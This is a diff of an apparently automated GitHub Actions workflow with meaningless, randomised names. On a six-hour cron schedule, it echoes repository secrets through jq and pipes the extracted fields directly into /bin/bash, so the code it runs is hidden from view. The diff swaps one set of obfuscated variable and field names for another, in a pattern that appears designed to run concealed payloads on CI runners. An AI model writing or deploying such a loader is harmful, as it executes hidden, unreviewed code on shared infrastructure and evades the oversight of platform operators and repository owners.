@@ -1,23 +1,22 @@
 name: parmesanannoyed
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '31 4/6 * * *'
+    - cron: '4 3/6 * * *'
 
-jobs:  # 10974
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: parmesanannoyed
         env:
-          efqu1941: ${{ secrets.efqu1941 }}
+          nej0: ${{ secrets.nej0 }}
         run: |
-          echo $efqu1941 | jq -r .s930 | /bin/bash
-          echo $in0000 | jq -r .tat37 | /bin/bash
-          echo $big48183 | jq -r .fckc37559 | /bin/bash
-          echo $muq91 | jq -r .q1 | /bin/bash
-          echo $lac4442 | jq -r .rfkx097 | /bin/bash
+          echo $nej0 | jq -r .cvhs08 | /bin/bash
+          echo $xxyai96845 | jq -r .th5748 | /bin/bash
+          echo $qqw3 | jq -r .fhlv1 | /bin/bash
+          echo $woez4 | jq -r .erp0 | /bin/bash
+          echo $tbpmp08 | jq -r .bp65155 | /bin/bash
+          echo $bouh07905 | jq -r .eiwjg95 | /bin/bash
 
